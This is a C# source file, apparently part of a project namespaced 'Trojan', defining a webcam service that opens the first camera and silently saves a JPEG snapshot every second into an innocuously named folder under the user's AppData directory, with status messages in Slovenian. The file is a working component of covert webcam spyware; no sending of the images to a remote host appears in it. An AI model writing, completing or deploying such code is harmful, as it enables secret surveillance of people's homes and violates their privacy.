using AForge.Video;
using AForge.Video.DirectShow;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Timers;
using Timer = System.Timers.Timer;

namespace Trojan.Services
{
    public class WebcamService
    {
        private VideoCaptureDevice _videoSource;
        private FilterInfoCollection _videoDevices;
        private System.Timers.Timer _timer;
        private Bitmap _currentFrame;

        public void Start()
        {
            try
            {
                _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                Console.WriteLine($"Najdenih kamer: {_videoDevices.Count}");

                foreach (FilterInfo device in _videoDevices)
                {
                    Console.WriteLine($"Kamera: {device.Name}");
                }

                if (_videoDevices.Count == 0)
                {
                    Console.WriteLine("Webcam ni bila najdena.");
                    return;
                }

                _videoSource = new VideoCaptureDevice(_videoDevices[0].MonikerString);
                _videoSource.NewFrame += VideoSource_NewFrame;
                _videoSource.Start();

                _timer = new Timer(1000);
                _timer.Elapsed += Timer_Elapsed;
                _timer.Start();

                Console.WriteLine($"Uporabljam kamero: {_videoDevices[0].Name}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Napaka pri zagonu kamere: {ex}");
            }
        }

        private void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            _currentFrame?.Dispose();
            _currentFrame = (Bitmap)eventArgs.Frame.Clone();
        }

        private void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            if (_currentFrame == null)
                return;

            try
            {
                string folder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "gnezdece",
                    "slikice"
                );

                if (!Directory.Exists(folder))
                    Directory.CreateDirectory(folder);

                string fileName = $"image_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                string fullPath = Path.Combine(folder, fileName);

                _currentFrame.Save(fullPath, ImageFormat.Jpeg);

                Console.WriteLine($"Shranjeno: {fullPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        public void Stop()
        {
            _timer?.Stop();

            if (_videoSource != null && _videoSource.IsRunning)
            {
                _videoSource.SignalToStop();
                _videoSource.WaitForStop();
            }

            _currentFrame?.Dispose();

            Console.WriteLine("Webcam ustavljena.");
        }
    }
}